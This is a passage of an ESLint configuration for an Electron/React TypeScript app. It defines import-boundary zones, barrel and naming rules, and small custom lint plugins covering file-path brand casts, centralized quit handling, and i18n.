import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

import tseslint from '@electron-toolkit/eslint-config-ts'
import eslint from '@eslint/js'
import eslintReact from '@eslint-react/eslint-plugin'
import { defineConfig } from 'eslint/config'
import { createTypeScriptImportResolver } from 'eslint-import-resolver-typescript'
import importX from 'eslint-plugin-import-x'
import importZod from 'eslint-plugin-import-zod'
import oxlint from 'eslint-plugin-oxlint'
import reactHooks from 'eslint-plugin-react-hooks'
import simpleImportSort from 'eslint-plugin-simple-import-sort'
import unusedImports from 'eslint-plugin-unused-imports'
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

// --- renderer dependency-direction boundary gate (import-x/no-restricted-paths) ---
const RENDERER_DIRNAME = path.dirname(fileURLToPath(import.meta.url))
const PAGE_DOMAINS = fs
  .readdirSync(path.join(RENDERER_DIRNAME, 'src/renderer/pages'), { withFileTypes: true })
  .filter((d) => d.isDirectory())
  .map((d) => d.name)

// A page must not import a sibling page domain; its own subtree is allowed via `except` (resolved relative to `from`).
const pageSiblingZones = PAGE_DOMAINS.map((p) => ({
  target: `src/renderer/pages/${p}`,
  from: 'src/renderer/pages',
  except: [`./${p}`],
  message: 'A page must not import another page (cross-page coupling). architecture/renderer.md §7.'
}))

// Topic barrels under services/: a services/<topic>/ exposes exactly one curated index.ts as its sole
// external entry (architecture/renderer.md §3.1/§5). Auto-discovered from the filesystem so a new topic dir
// needs zero rule edits — mirrors pageSiblingZones above. A topic's own subtree is excluded from `target`
// (extglob negation), so internal `./sibling` imports stay legal while every outside importer is limited to
// the barrel. Applied in every renderer importer region via blocks L/P/B below.
const SERVICES_DIR = path.join(RENDERER_DIRNAME, 'src/renderer/services')
const serviceTopics = fs
  .readdirSync(SERVICES_DIR, { withFileTypes: true })
  .filter((d) => d.isDirectory() && d.name !== '__tests__' && d.name !== '__mocks__')
  .filter((d) => fs.existsSync(path.join(SERVICES_DIR, d.name, 'index.ts')))
  .map((d) => d.name)

const serviceBarrelZones = serviceTopics.map((topic) => ({
  target: [
    `src/renderer/!(services)/**/*`, // importers outside services/ entirely
    `src/renderer/services/!(${topic})/**/*`, // sibling topic dirs
    `src/renderer/services/*` // flat files at the services/ root
  ],
  from: [
    `src/renderer/services/${topic}/!(index).{ts,tsx,js,jsx}`,
    `src/renderer/services/${topic}/!(index)/**/*`
  ],
  message: `services/${topic}/ is a topic barrel — import @renderer/services/${topic} (its index.ts), not its internals. architecture/renderer.md §3.1/§5.`
}))

// Each block's `files` is scoped so the three no-restricted-paths instances (L/P/B) never both apply to one
// file — flat config merges rules by key (last-wins), which would otherwise drop one block silently.
const SHARED_BUCKET_FILES = [
  'src/renderer/components/**/*.{ts,tsx,js,jsx}',
  'src/renderer/hooks/**/*.{ts,tsx,js,jsx}',
  'src/renderer/services/**/*.{ts,tsx,js,jsx}',
  'src/renderer/utils/**/*.{ts,tsx,js,jsx}'
]
const PAGE_FILES = ['src/renderer/pages/**/*.{ts,tsx,js,jsx}']
const RENDERER_IGNORES = ['src/renderer/**/*.test.*', 'src/renderer/**/__tests__/**', 'src/renderer/**/__mocks__/**']
const boundarySettings = {
  'import-x/resolver-next': [
    createTypeScriptImportResolver({ project: path.join(RENDERER_DIRNAME, 'tsconfig.web.json'), alwaysTryTypes: true })
  ]
}
// Two independent gates: block1 (layer edges) is enforced as error — Stage 1 cleared it; block2 (sibling pages) stays warn until features-ization.
const RENDERER_BOUNDARY = 'error'
const PAGE_SIBLING = process.env.RENDERER_PAGE_SIBLING_ERROR ? 'error' : 'warn'

// --- import bans (@typescript-eslint/no-restricted-imports) ---
// Flat config replaces a rule wholesale rather than merging it, so every ban that
// applies to the same files must live in ONE `patterns` array under ONE rule name.
// To add a ban: define it here and list it in the scope block(s) below — never reach
// for a second rule name (e.g. the base `no-restricted-imports`) to dodge the override.
// To exempt a single sanctioned call site, put an eslint-disable comment on its import.
const BAN_RENDERER_FROM_MAIN = {
  group: ['@renderer', '@renderer/**', '**/renderer/**'],
  message:
    'Main/preload must not import renderer code. Use `@shared` for cross-process types, or `src/main` for main-only types. See docs/references/architecture/shared-layer.md.'
}
// Only reaches src/main + src/preload (below). `tests/**` is globally ignored by this
// config, so the out-of-src harness is not covered — it goes through applyMigrations by
// convention, not by enforcement.
const BAN_DRIZZLE_MIGRATOR = {
  group: ['drizzle-orm/*/migrator'],
  message:
    "Do not call drizzle's migrate() directly — its transaction makes drizzle-kit's `PRAGMA foreign_keys=OFF` a no-op, so any table-recreate migration silently cascades child rows away. Use applyMigrations() from @data/db/applyMigrations."
}

// --- barrel / module-boundary rules (naming-conventions.md §6.4) ---
// An inline custom plugin (like the `lifecycle` plugin below), not no-restricted-paths:
// full-src barrel closure needs a private boundary per directory at arbitrary depth, which
// no-restricted-paths cannot express without per-level target globs. Barrel discovery reuses
// the same "pure re-export index.ts" classifier the audit validated. All rules are `warn`.
const SRC_DIR = path.join(RENDERER_DIRNAME, 'src')
const BARREL_BUCKET_ROOT_RE = /[\\/]src[\\/](?:main|renderer|shared)[\\/](?:types|utils|services)[\\/]index\.tsx?$/

const stripCodeComments = (s) => s.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/.*$/gm, '')
const isPureReexportIndex = (content) => {
  if (!/\bexport\b[^;]*?\bfrom[ \t]*['"]/.test(content)) return false
  const rest = stripCodeComments(content)
    .replace(/(?:^|\n)[ \t]*(?:import|export)\b[^;]*?from[ \t]*['"][^'"]+['"];?/g, '\n')
    .replace(/(?:^|\n)[ \t]*import[ \t]*['"][^'"]+['"];?/g, '\n')
  return !/\bexport\b/.test(rest)
}
const collectIndexTs = (dir, out = []) => {
  let entries
  try {
    entries = fs.readdirSync(dir, { withFileTypes: true })
  } catch {
    return out
  }
  for (const e of entries) {
    if (e.name === 'node_modules' || e.name === '__tests__' || e.name === '__mocks__') continue
    const p = path.join(dir, e.name)
    if (e.isDirectory()) collectIndexTs(p, out)
    else if (e.name === 'index.ts') out.push(p)
  }
  return out
}
const BARREL_DIRS = new Set()
for (const idx of collectIndexTs(SRC_DIR)) {
  try {
    if (isPureReexportIndex(fs.readFileSync(idx, 'utf8'))) BARREL_DIRS.add(path.dirname(idx))
  } catch {}
}
const BARREL_DIRS_DEEPEST_FIRST = [...BARREL_DIRS].sort((a, b) => b.length - a.length)
const innermostBarrelDir = (file) => {
  for (const d of BARREL_DIRS_DEEPEST_FIRST) if (file === d || file.startsWith(d + path.sep)) return d
  return null
}
// The boundary a reference crosses is the OUTERMOST barrel dir containing the target but not
// the importer — the innermost would let `A/B` (an inner barrel's index) bypass A's door when
// barrels are nested.
const BARREL_DIRS_SHALLOWEST_FIRST = [...BARREL_DIRS_DEEPEST_FIRST].reverse()
const outermostCrossedBarrelDir = (tgt, from) => {
  for (const d of BARREL_DIRS_SHALLOWEST_FIRST)
    if (tgt.startsWith(d + path.sep) && from !== d && !from.startsWith(d + path.sep)) return d
  return null
}
const BARREL_RESOLVE_CACHE = new Map()
// Unresolved specs are skipped — misses only, never false positives. Deliberately unresolved:
// `@logger` (single-file target, cannot hide a deep import), `@application` (bare-only usage,
// zero `@application/` deep paths in src), `@test-helpers`/`@test-mocks` (tests are exempt),
// `@dusk/*` (packages/*, outside src).
const resolveBarrelSpec = (spec, fromFile) => {
  const key = `${fromFile}\0${spec}`
  if (BARREL_RESOLVE_CACHE.has(key)) return BARREL_RESOLVE_CACHE.get(key)
  const proc = fromFile.includes(`${path.sep}src${path.sep}main${path.sep}`) ? 'main' : 'renderer'
  let base = null
  if (spec.startsWith('./') || spec.startsWith('../')) base = path.resolve(path.dirname(fromFile), spec)
  else if (spec.startsWith('@renderer/')) base = path.join(SRC_DIR, 'renderer', spec.slice(10))
  else if (spec.startsWith('@main/')) base = path.join(SRC_DIR, 'main', spec.slice(6))
  else if (spec.startsWith('@shared/')) base = path.join(SRC_DIR, 'shared', spec.slice(8))
  else if (spec.startsWith('@data/')) base = path.join(SRC_DIR, proc === 'main' ? 'main' : 'renderer', 'data', spec.slice(6))
  let resolved = null
  if (base) {
    for (const c of [`${base}.ts`, `${base}.tsx`, path.join(base, 'index.ts'), path.join(base, 'index.tsx'), base]) {
      try {
        if (fs.statSync(c).isFile()) {
          resolved = c
          break
        }
      } catch {}
    }
  }
  BARREL_RESOLVE_CACHE.set(key, resolved)
  return resolved
}
const barrelFilename = (ctx) => ctx.filename ?? ctx.getFilename()

const barrelPlugin = {
  rules: {
    // 1a — no `export *`; barrels use explicit named re-exports.
    'no-export-star': {
      meta: { type: 'problem', schema: [] },
      create(ctx) {
        return {
          ExportAllDeclaration(node) {
            if (node.source) ctx.report({ node, message: 'No `export *` — use explicit named re-exports (naming-conventions.md §6.4 rule 1).' })
          }
        }
      }
    },
    // 1b — an index.ts barrel is pure re-export: no default impl, no local declarations/bindings,
    // no side-effect imports, no top-level logic.
    'index-no-impl': {
      meta: { type: 'problem', schema: [] },
      create(ctx) {
        const f = barrelFilename(ctx)
        if (!/[\\/]index\.ts$/.test(f)) return {}
        return {
          Program(node) {
            const stmt = node.body.find((s) => !/^(?:Import|Export)/.test(s.type))
            if (stmt) ctx.report({ node: stmt, message: 'A barrel is pure re-export — no top-level statements; move logic to a named file (naming-conventions.md §6.4 rule 1).' })
          },
          ImportDeclaration(node) {
            if (!node.specifiers.length)
              ctx.report({ node, message: 'A barrel is pure re-export — no side-effect imports; registration belongs in a named module (naming-conventions.md §6.4 rule 1).' })
          },
          ExportDefaultDeclaration(node) {
            ctx.report({ node, message: 'A barrel is pure re-export — no `export default` implementation; use a named file (naming-conventions.md §6.4).' })
          },
          ExportNamedDeclaration(node) {
            if (node.declaration)
              ctx.report({ node, message: 'A barrel is pure re-export — no local declarations; move implementation to a named file (naming-conventions.md §6.4).' })
            else if (!node.source && node.specifiers.length)
              ctx.report({ node, message: 'A barrel re-exports from other modules — it must not export local bindings (naming-conventions.md §6.4).' })
          }
        }
      }
    },
    // 1c — no `index.tsx` anywhere: a barrel is `index.ts` (no JSX), a component uses a named
    // file, and a TanStack index route uses the flat dot form (`<segment>.index.tsx`).
    'no-index-tsx': {
      meta: { type: 'problem', schema: [] },
      create(ctx) {
        const f = barrelFilename(ctx)
        if (!/[\\/]index\.tsx$/.test(f)) return {}
        return {
          Program(node) {
            ctx.report({ node, message: 'No `index.tsx` — a barrel is `index.ts` (re-export has no JSX); a component uses a named file; a TanStack index route uses the flat dot form `<segment>.index.tsx` (naming-conventions.md §6.4).' })
          }
        }
      }
    },
    // 1d — a barrel exposes named exports, not a forwarded bare default.
    'named-only': {
      meta: { type: 'problem', schema: [] },
      create(ctx) {
        const f = barrelFilename(ctx)
        if (!/[\\/]index\.tsx?$/.test(f)) return {}
        return {
          ExportNamedDeclaration(node) {
            if (!node.source) return
            for (const s of node.specifiers)
              if (s.exported && s.exported.name === 'default')
                ctx.report({ node: s, message: 'A barrel exposes named exports — name it (`export { default as Foo } from`), do not forward a bare default (naming-conventions.md §6.4 rule 1).' })
          }
        }
      }
    },
    // 2 — closed boundary: outside code must import a barrel's index, never its internals.
    'closed': {
      meta: { type: 'problem', schema: [] },
      create(ctx) {
        const f = barrelFilename(ctx)
        const check = (node, spec) => {
          const tgt = resolveBarrelSpec(spec, f)
          if (!tgt) return
          const d = outermostCrossedBarrelDir(tgt, f)
          if (!d || tgt === path.join(d, 'index.ts')) return
          ctx.report({ node, message: `Deep import into barrel \`${path.relative(SRC_DIR, d)}\` — import its index, not its internals (naming-conventions.md §6.4 rule 2).` })
        }
        return {
          ImportDeclaration(node) {
            if (node.source) check(node, node.source.value)
          },
          ExportNamedDeclaration(node) {
            if (node.source) check(node, node.source.value)
          },
          ExportAllDeclaration(node) {
            if (node.source) check(node, node.source.value)
          },
          ImportExpression(node) {
            if (node.source && node.source.type === 'Literal') check(node, node.source.value)
          }
        }
      }
    },
    // 3a — no nesting: a barrel index must not re-export another barrel.
    'no-nesting': {
      meta: { type: 'problem', schema: [] },
      create(ctx) {
        const f = barrelFilename(ctx)
        if (!/[\\/]index\.ts$/.test(f) || !BARREL_DIRS.has(path.dirname(f))) return {}
        const db = path.dirname(f)
        const check = (node, spec) => {
          const tgt = resolveBarrelSpec(spec, f)
          if (!tgt) return
          const d2 = innermostBarrelDir(tgt)
          if (!d2 || d2 === db) return
          ctx.report({ node, message: `A barrel must not re-export another barrel \`${path.relative(SRC_DIR, d2)}\` — let each unit own its door (naming-conventions.md §6.4 rule 3).` })
        }
        return {
          ExportNamedDeclaration(node) {
            if (node.source) check(node, node.source.value)
          },
          ExportAllDeclaration(node) {
            if (node.source) check(node, node.source.value)
          },
          ImportDeclaration(node) {
            if (node.source) check(node, node.source.value)
          }
        }
      }
    },
    // 3b — bucket roots (types/utils/services) carry no barrel.
    'no-bucket-root': {
      meta: { type: 'problem', schema: [] },
      create(ctx) {
        if (!BARREL_BUCKET_ROOT_RE.test(barrelFilename(ctx))) return {}
        return {
          Program(node) {
            ctx.report({ node, message: 'Bucket roots (types/utils/services) carry no barrel — import the specific file/topic (naming-conventions.md §6.4 rule 3 / §4.8).' })
          }
        }
      }
    }
  }
}

// --- directory & file naming rules (naming-conventions.md §3–§4, §6.6) ---
// Inline custom plugin (like `barrel` above). ESLint is per-file, so a directory name is checked by
// deriving each ancestor segment from the linted file's path (a dir with no linted file is thus
// invisible — acceptable: every code dir has a .ts/.tsx). Only zones where path → role is
// deterministic are enforced; the semantic splits left to review are bucket-vs-domain plural/singular
// (§4.9) and class-file PascalCase vs function-file camelCase (§3.2). Acronym-internal casing (§6.1)
// is also out of scope here.
const isKebabName = (s) => /^[a-z0-9]+(?:-[a-z0-9]+)*$/.test(s)
const isCamelName = (s) => /^[a-z][a-zA-Z0-9]*$/.test(s)
const isPascalName = (s) => /^[A-Z][a-zA-Z0-9]*$/.test(s)
const isRouteToken = (s) => s.startsWith('$') || s.startsWith('_') // $appId, $, __root, _pathless
const isModuleFileStem = (s) => {
  const b = s.replace(/^_+/, '') // _columnHelpers.ts: leading-underscore shared construct (§3.2)
  return isCamelName(b) || isPascalName(b)
}
const NAMING_EXEMPT_DIRS = new Set(['__tests__', '__mocks__', '__snapshots__'])
// First matching prefix wins; unmanaged zones bail before the generic renderer/src zones.
const NAMING_ZONES = [
  { prefix: 'packages/ui/', root: 2, label: 'packages/ui', dir: isKebabName, dirExpect: 'kebab-case', file: isKebabName, fileExpect: 'kebab-case' },
  { prefix: 'src/renderer/routes/', root: 3, label: 'routes', dir: (s) => isKebabName(s) || isRouteToken(s), dirExpect: 'kebab-case', file: (s) => isKebabName(s) || isRouteToken(s), fileExpect: 'kebab-case' },
  { prefix: 'src/renderer/assets/', unmanaged: true },
  { prefix: 'src/renderer/', root: 2, label: 'src/renderer', dir: (s) => isCamelName(s) || isPascalName(s), dirExpect: 'camelCase (module) or PascalCase (component)', file: isModuleFileStem, fileExpect: 'camelCase or PascalCase' },
  { prefix: 'src/main/', root: 2, label: 'src/main', dir: isCamelName, dirExpect: 'camelCase', file: isModuleFileStem, fileExpect: 'camelCase or PascalCase' },
  { prefix: 'src/shared/', root: 2, label: 'src/shared', dir: isCamelName, dirExpect: 'camelCase', file: isModuleFileStem, fileExpect: 'camelCase or PascalCase' },
  { prefix: 'src/preload/', root: 2, label: 'src/preload', dir: isCamelName, dirExpect: 'camelCase', file: isModuleFileStem, fileExpect: 'camelCase or PascalCase' }
]
const namingReportedDirs = new Set()

const namingPlugin = {
  rules: {
    'path-case': {
      meta: { type: 'problem', schema: [] },
      create(ctx) {
        const abs = ctx.filename ?? ctx.getFilename()
        const rel = path.relative(RENDERER_DIRNAME, abs).split(path.sep).join('/')
        const zone = NAMING_ZONES.find((z) => rel.startsWith(z.prefix))
        if (!zone || zone.unmanaged) return {}
        return {
          Program(node) {
            const parts = rel.split('/')
            const fileName = parts[parts.length - 1]
            const dirSegs = parts.slice(zone.root, parts.length - 1)
            for (let i = 0; i < dirSegs.length; i++) {
              const seg = dirSegs[i]
              if (seg.startsWith('.') || NAMING_EXEMPT_DIRS.has(seg) || zone.dir(seg)) continue // dotdirs (.storybook, .github) are tool conventions
              const dirRel = parts.slice(0, zone.root + i + 1).join('/')
              if (namingReportedDirs.has(dirRel)) continue
              namingReportedDirs.add(dirRel)
              ctx.report({ node, message: `Directory \`${dirRel}\`: segment \`${seg}\` must be ${zone.dirExpect} under ${zone.label} (naming-conventions.md §4).` })
            }
            if (/^index\.tsx?$/.test(fileName) || /\.d\.ts$/.test(fileName)) return // index.* owned by barrel/*; *.d.ts by §3.5
            const stem = fileName.split('.')[0]
            if (!stem || zone.file(stem)) return
            ctx.report({ node, message: `File \`${fileName}\`: name \`${stem}\` must be ${zone.fileExpect} under ${zone.label} (naming-conventions.md §3).` })
          }
        }
      }
    }
  }
}

export default defineConfig([
  eslint.configs.recommended,
  tseslint.configs.recommended,
  eslintReact.configs['recommended-typescript'],
  reactHooks.configs['recommended-latest'],
  {
    plugins: {
      'simple-import-sort': simpleImportSort,
      'unused-imports': unusedImports,
      'import-zod': importZod
    },
    rules: {
      '@typescript-eslint/explicit-function-return-type': 'off',
      '@typescript-eslint/no-explicit-any': 'off',
      '@typescript-eslint/no-non-null-asserted-optional-chain': 'off',
      'simple-import-sort/imports': 'error',
      'simple-import-sort/exports': 'error',
      'unused-imports/no-unused-imports': 'error',
      '@eslint-react/no-prop-types': 'error',
      'import-zod/prefer-zod-namespace': 'error'
    }
  },
  // Configuration for ensuring compatibility with the original ESLint(8.x) rules
  {
    rules: {
      '@typescript-eslint/no-require-imports': 'off',
      '@typescript-eslint/no-unused-vars': ['error', { caughtErrors: 'none' }],
      '@typescript-eslint/no-unused-expressions': 'off',
      '@typescript-eslint/no-empty-object-type': 'off',
      '@eslint-react/hooks-extra/no-direct-set-state-in-use-effect': 'off',
      '@eslint-react/web-api/no-leaked-event-listener': 'off',
      '@eslint-react/web-api/no-leaked-timeout': 'off',
      '@eslint-react/no-unknown-property': 'off',
      '@eslint-react/no-nested-component-definitions': 'off',
      '@eslint-react/dom/no-dangerously-set-innerhtml': 'off',
      '@eslint-react/no-array-index-key': 'off',
      '@eslint-react/no-unstable-default-props': 'off',
      '@eslint-react/no-unstable-context-value': 'off',
      '@eslint-react/hooks-extra/prefer-use-state-lazy-initialization': 'off',
      '@eslint-react/hooks-extra/no-unnecessary-use-prefix': 'off',
      '@eslint-react/no-children-to-array': 'off'
    }
  },
  {
    ignores: [
      'node_modules/**',
      'build/**',
      'dist/**',
      'out/**',
      'local/**',
      'tests/**',
      '.yarn/**',
      '.gitignore',
      '.conductor/**',
      'scripts/cloudflare-worker.js',
      'src/main/services/nutstore/sso/lib/**',
      'src/renderer/ui/**',
      'src/renderer/routeTree.gen.ts',
      'packages/**/dist',
      'packages/**/storybook-static/**',
      'v2-refactor-temp/**'
    ]
  },
  // turn off oxlint supported rules.
  ...oxlint.configs['flat/eslint'],
  ...oxlint.configs['flat/typescript'],
  ...oxlint.configs['flat/unicorn'],
  // Custom rules should be after oxlint to overwrite
  // LoggerService Custom Rules - only apply to src directory
  {
    files: ['src/**/*.{ts,tsx,js,jsx}'],
    ignores: ['src/**/__tests__/**', 'src/**/__mocks__/**', 'src/**/*.test.*', 'src/preload/**'],
    rules: {
      'no-restricted-syntax': [
        process.env.CI ? 'error' : 'warn',
        {
          selector: 'CallExpression[callee.object.name="console"]',
          message:
            '❗Dusk uses unified LoggerService: 📖 docs/references/logging/README.md\n\n'
        }
      ]
    }
  },
  // Path brand integrity — `as AbsoluteFilePath` / `as CanonicalFilePath` forge the
  // brands, skipping the validation each asserts. `AbsoluteFilePath` asserts shape
  // validation (build via AbsoluteFilePathSchema.parse); `CanonicalFilePath` asserts
  // the byte-faithful lexical form that backs the external-path dedup key
  // (build via the canonicalizeFilePath() factory). A forged
  // `as CanonicalFilePath` silently bypasses canonicalization and can write a
  // ghost-duplicate key, so the stronger brand is guarded too.
  // Exemptions: test fixtures; and one deliberate raw-OS-path regime — the
  // tree builder (tree/**) holds raw chokidar/OS event paths that are compared
  // byte-for-byte against event paths and are trusted as-is, so they `as AbsoluteFilePath`
  // rather than routing through validation.
  {
    files: ['src/**/*.{ts,tsx}'],
    ignores: [
      'src/main/services/file/tree/**',
      'src/**/__tests__/**',
      'src/**/__mocks__/**',
      'src/**/*.test.*'
    ],
    plugins: {
      'filepath-brand': {
        rules: {
          'no-as-filepath': {
            meta: {
              type: 'problem',
              docs: {
                description:
                  'Disallow `as AbsoluteFilePath` / `as CanonicalFilePath` casts. Both are Zod-derived brands: AbsoluteFilePath asserts shape validation (absolute path, no null bytes), CanonicalFilePath additionally asserts the byte-faithful lexical form backing the dedup key. Forging either bypasses its validation. Construct via AbsoluteFilePathSchema.parse() / canonicalizeFilePath().',
                recommended: true
              },
              messages: {
                noAsFilePath:
                  '`as AbsoluteFilePath` forges the brand, skipping AbsoluteFilePathSchema\'s absolute-path validation. Build it with AbsoluteFilePathSchema.parse(value) instead. If this is a deliberate raw-path regime, move it under an exempted path or justify with an eslint-disable + reason.',
                noAsCanonicalFilePath:
                  '`as CanonicalFilePath` forges the brand, skipping canonicalization — a non-canonical value silently becomes a ghost-duplicate dedup key. Build it with canonicalizeFilePath(value) instead, or justify the sanctioned producer with an eslint-disable + reason.'
              }
            },
            create(context) {
              // Matches both `x as T` (TSAsExpression) and `<T>x` (TSTypeAssertion).
              // Limitation: name-based, so an aliased import (`import { AbsoluteFilePath as AFP }`
              // then `x as AFP`) is not caught — aliasing a brand solely to forge it is not a
              // real-world pattern, and resolving aliases would require full scope analysis.
              function checkAssertion(node) {
                const ann = node.typeAnnotation
                if (ann?.type !== 'TSTypeReference' || ann.typeName?.type !== 'Identifier') return
                if (ann.typeName.name === 'AbsoluteFilePath') {
                  context.report({ node, messageId: 'noAsFilePath' })
                } else if (ann.typeName.name === 'CanonicalFilePath') {
                  context.report({ node, messageId: 'noAsCanonicalFilePath' })
                }
              }
              return {
                TSAsExpression: checkAssertion,
                TSTypeAssertion: checkAssertion
              }
            }
          }
        }
      }
    },
    rules: {
      'filepath-brand/no-as-filepath': process.env.CI ? 'error' : 'warn'
    }
  },
  // Application lifecycle - all quit-related APIs and events are managed by Application.ts
  {
    files: ['src/main/**/*.{ts,tsx,js,jsx}'],
    ignores: [
      'src/main/core/application/Application.ts',
      'src/main/data/migration/**',
      'src/main/**/__tests__/**',
      'src/main/**/__mocks__/**',
      'src/main/**/*.test.*'
    ],
    plugins: {
      lifecycle: {
        rules: {
          'no-direct-quit': {
            meta: {
              type: 'problem',
              docs: {
                description:
                  'Disallow direct use of quit-related Electron/Node.js APIs. All quit handling is centralized in Application.ts.',
                recommended: true
              },
              messages: {
                restricted:
                  'Quit-related APIs and events are managed by the Application lifecycle. Do not use "{{name}}" directly. See docs/references/lifecycle/application-overview.md'
              }
            },
            create(context) {
              const RESTRICTED_APP_METHODS = new Set(['quit', 'exit', 'relaunch'])
              const RESTRICTED_APP_EVENTS = new Set(['before-quit', 'will-quit', 'window-all-closed'])
              const RESTRICTED_SIGNALS = new Set(['SIGINT', 'SIGTERM'])

              return {
                CallExpression(node) {
                  const { callee } = node
                  if (callee.type !== 'MemberExpression') return
                  if (callee.object.type !== 'Identifier') return

                  const obj = callee.object.name
                  const prop = callee.property.type === 'Identifier' ? callee.property.name : null
                  if (!prop) return

                  // app.quit() / app.exit() / app.relaunch()
                  if (obj === 'app' && RESTRICTED_APP_METHODS.has(prop)) {
                    context.report({ node, messageId: 'restricted', data: { name: `app.${prop}()` } })
                    return
                  }

                  // app.on/once('before-quit'|'will-quit'|'window-all-closed', ...)
                  if (obj === 'app' && (prop === 'on' || prop === 'once')) {
                    const firstArg = node.arguments[0]
                    if (firstArg?.type === 'Literal' && RESTRICTED_APP_EVENTS.has(firstArg.value)) {
                      context.report({
                        node,
                        messageId: 'restricted',
                        data: { name: `app.${prop}('${firstArg.value}')` }
                      })
                    }
                    return
                  }

                  // process.on/once('SIGINT'|'SIGTERM', ...)
                  if (obj === 'process' && (prop === 'on' || prop === 'once')) {
                    const firstArg = node.arguments[0]
                    if (firstArg?.type === 'Literal' && RESTRICTED_SIGNALS.has(firstArg.value)) {
                      context.report({
                        node,
                        messageId: 'restricted',
                        data: { name: `process.${prop}('${firstArg.value}')` }
                      })
                    }
                  }
                }
              }
            }
          }
        }
      }
    },
    rules: {
      'lifecycle/no-direct-quit': 'warn'
    }
  },
  // i18n
  {
    files: ['**/*.{ts,tsx,js,jsx}'],
    languageOptions: {
      ecmaVersion: 2022,
      sourceType: 'module'
    },
    plugins: {
      i18n: {
        rules: {
          'no-template-in-t': {
            meta: {
              type: 'problem',
              docs: {
                description: '⚠️ Avoid template literals in t() — they make rendering output unpredictable',
                recommended: true
              },
              messages: {
                noTemplateInT: '⚠️ Avoid template literals in t() — they make rendering output unpredictable'
              }
            },
            create(context) {
              return {
                CallExpression(node) {
                  const { callee, arguments: args } = node
                  const isTFunction =
                    (callee.type === 'Identifier' && callee.name === 't') ||
                    (callee.type === 'MemberExpression' &&
                      callee.property.type === 'Identifier' &&
                      callee.property.name === 't')

                  if (isTFunction && args[0]?.type === 'TemplateLiteral') {
                    context.report({
                      node: args[0],
                      messageId: 'noTemplateInT'
                    })
                  }
                }
              }
            }
          }
        }
      }
    },
    rules: {
      'i18n/no-template-in-t': 'warn'
    }
  },
  {
    // Bundle guard: the IpcApi zod schema *values* must never enter the renderer
    // bundle. Renderer code may only `import type` from the schema modules.
    files: ['src/renderer/**/*.{ts,tsx,js,jsx}'],
    ignores: ['src/renderer/**/*.test.*', 'src/renderer/**/__tests__/**', 'src/renderer/**/__mocks__/**'],
    rules: {
      '@typescript-eslint/no-restricted-imports': [
        'error',
        {
          patterns: [
            {
              group: ['@shared/ipc/schemas', '@shared/ipc/schemas/*'],
              allowTypeImports: true,
              message:
                'Renderer may only `import type` from @shared/ipc/schemas — a value import pulls the entire zod schema set into the renderer bundle.'
            }
          ]
        }
      ]
    }
  },
  {
    // Import bans for main/preload — see the BAN_* definitions above for each one's rationale.
    //
    // Boundary guard: the main process and preload must not import renderer code.
    // Cross-process symbols belong in `@shared`; main-only symbols in `src/main`.
    // Both the `@renderer` alias and relative `**/renderer/**` paths are banned; the
    // main i18n catalog now lives in `src/main/i18n`, and tests that need renderer
    // catalog data read it from disk (fs) rather than importing it.
    files: ['src/main/**/*.{ts,tsx,js,jsx}', 'src/preload/**/*.{ts,tsx,js,jsx}'],
    rules: {
      '@typescript-eslint/no-restricted-imports': ['error', { patterns: [BAN_RENDERER_FROM_MAIN, BAN_DRIZZLE_MIGRATOR] }]
    }
  },
  // Renderer boundary block L: layer edges into shared buckets — Zone A (shared→pages/windows) + Zone C (utils impurity).
  // Scoped to shared-bucket files so it never collides with block P on a pages file. Flips to error once A+C clear.
  {
    files: SHARED_BUCKET_FILES,
    ignores: RENDERER_IGNORES,
    plugins: { 'import-x': importX },
    settings: boundarySettings,
    rules: {
      'import-x/no-restricted-paths': [
        RENDERER_BOUNDARY,
        {
          basePath: RENDERER_DIRNAME,
          zones: [
            {
              target: [
                'src/renderer/components',
                'src/renderer/hooks',
                'src/renderer/services',
                'src/renderer/utils'
              ],
              from: ['src/renderer/pages', 'src/renderer/windows'],
              message: 'Shared buckets must not import pages/windows (reverse layer edge). architecture/renderer.md §7.'
            },
            {
              target: 'src/renderer/utils',
              from: ['src/renderer/components', 'src/renderer/hooks'],
              message: 'utils/ is stateless and may call downward infra (data/ipc) but must not import components/hooks or any higher app layer. architecture/renderer.md §3.'
            },
            // @logger is a §2 primitive that physically lives under services/; keep it out of the restricted glob.
            {
              target: 'src/renderer/utils',
              from: [
                'src/renderer/services/!(LoggerService).{ts,tsx,js,jsx}',
                'src/renderer/services/!(LoggerService)/**/*'
              ],
              message: 'utils/ must not import renderer services (except @logger). architecture/renderer.md §3.'
            },
            ...serviceBarrelZones
          ]
        }
      ]
    }
  },
  // Renderer boundary block P: page-targeted edges — B-pw (page→window) + B-pp (page→sibling-page).
  // Scoped to pages files; both share one severity (one no-restricted-paths instance = one severity), held at warn
  // until features-ization clears the sibling-page edges.
  {
    files: PAGE_FILES,
    ignores: RENDERER_IGNORES,
    plugins: { 'import-x': importX },
    settings: boundarySettings,
    rules: {
      'import-x/no-restricted-paths': [
        PAGE_SIBLING,
        {
          basePath: RENDERER_DIRNAME,
          zones: [
            {
              target: 'src/renderer/pages',
              from: 'src/renderer/windows',
              message: 'A page must not import a window (reverse edge). architecture/renderer.md §2/§7.'
            },
            ...pageSiblingZones,
            ...serviceBarrelZones
          ]
        }
      ]
    }
  },
  // Renderer boundary block B: topic-barrel guard for the importer regions blocks L/P do not cover
  // (windows, routes, data, ipc, workers, …). Its `files` ignore the L and P scopes so it never shares a
  // file with them — avoiding the flat-config last-wins collision noted above. Held at error like block L.
  {
    files: ['src/renderer/**/*.{ts,tsx,js,jsx}'],
    ignores: [...RENDERER_IGNORES, ...SHARED_BUCKET_FILES, ...PAGE_FILES],
    plugins: { 'import-x': importX },
    settings: boundarySettings,
    rules: {
      'import-x/no-restricted-paths': [
        RENDERER_BOUNDARY,
        {
          basePath: RENDERER_DIRNAME,
          zones: [...serviceBarrelZones]
        }
      ]
    }
  },
  // Barrel / module-boundary rules (naming-conventions.md §6.4) — inline custom plugin, all error.
  {
    files: ['src/**/*.{ts,tsx}'],
    // tests are exempt by design: white-box tests may deep-import a barrel's internals
    ignores: ['src/**/*.test.*', 'src/**/__tests__/**', 'src/**/__mocks__/**'],
    plugins: { barrel: barrelPlugin },
    rules: {
      'barrel/no-export-star': 'error',
      'barrel/index-no-impl': 'error',
      'barrel/no-index-tsx': 'error',
      'barrel/named-only': 'error',
      'barrel/closed': 'error',
      'barrel/no-nesting': 'error',
      'barrel/no-bucket-root': 'error'
    }
  },
